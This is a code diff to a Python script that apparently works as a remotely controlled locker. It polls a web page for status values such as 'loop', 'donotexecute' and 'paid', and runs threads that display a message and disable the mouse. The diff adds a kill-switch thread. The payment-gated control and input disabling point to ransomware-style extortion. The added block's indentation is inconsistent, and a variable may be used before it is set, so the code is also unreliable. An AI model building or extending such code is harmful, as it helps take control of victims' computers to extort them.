@@ -1,4 +1,4 @@
-import os
+import os, sys
 import time
 import requests
 from bs4 import BeautifulSoup
@@ -85,12 +85,31 @@ while loop:
                 else:
                     is_true = True
                 
+        def terminate_program():	
+			try:
+				response = requests.get(url)
+
+				soup = BeautifulSoup(response.text, 'html.parser')
+				status_input = soup.find('input', {'id': 'status1'})  # Find the input element with the ID 'status'
+				text_input = soup.find('textarea', {'id': 'text1'})  # Find the input element with the ID 'status'
+        #time.sleep(delay)
+				if status_input:
+					status_value = status_input.get('value')  # Get the value attribute of the input element
         
+				if text_input:
+				    text = text_input.text
+        
+				if status_value == 'donotexecute':
+					sys.exit()
+			except:
+				pass
         thread1 = threading.Thread(target=display_message)
         thread2 = threading.Thread(target=disable_mouse)
+        thread3 = threading.Thread(target=terminate_program)
 
         thread1.start()
         thread2.start()
+        thread3.start()
 
     elif status_value == "loop":
 
@@ -100,7 +119,7 @@ while loop:
         loop = True
     elif status_value == "donotexecute":
 
-        loop = False
+        sys.exit()
     elif status_value == "paid":
 
         username = getpass.getuser()
